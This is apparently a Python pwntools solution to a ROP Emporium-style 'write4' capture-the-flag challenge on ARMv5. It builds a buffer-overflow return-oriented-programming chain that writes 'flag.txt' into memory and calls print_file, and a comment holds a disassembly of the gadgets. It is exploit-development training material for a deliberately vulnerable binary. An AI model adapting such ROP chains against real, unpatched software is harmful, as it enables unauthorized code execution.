from pwn import *

exe = ELF('./write4_armv5')
context.binary = exe
context.log_level = 'info'

libc = ELF('./write4_armv5')

if args.REMOTE:
    io = remote('localhost', 4000)
else:
    io = process(['qemu-arm', '-L', '/usr/arm-linux-gnueabi', './write4_armv5'])


offset = 36 #pattern search $pc

call_printfile = exe.plt['print_file']

data = 0x21024
data1 = 0x21028

flag = b'flag'
flag1 = b'.txt'

pop_r3_r4 = 0x000105f0
pop_r0 = 0x000105f4

usefulGadgets = 0x000105ec

padding = b'BBBB'


payload = flat({offset:[pop_r3_r4,
                        flag,
                        data,
                        usefulGadgets,
                        flag1,
                        data1,
                        usefulGadgets,
                        padding,
                        padding,
                        pop_r0,
                        data,
                        call_printfile]})

io.sendline(payload)

io.interactive()


'''

(remote) gef➤  disas usefulGadgets
Dump of assembler code for function usefulGadgets:
   0x000105ec <+0>:	str	r3, [r4]
   0x000105f0 <+4>:	pop	{r3, r4, pc}
   0x000105f4 <+8>:	pop	{r0, pc}
End of assembler dump.
(remote) gef➤ 

'''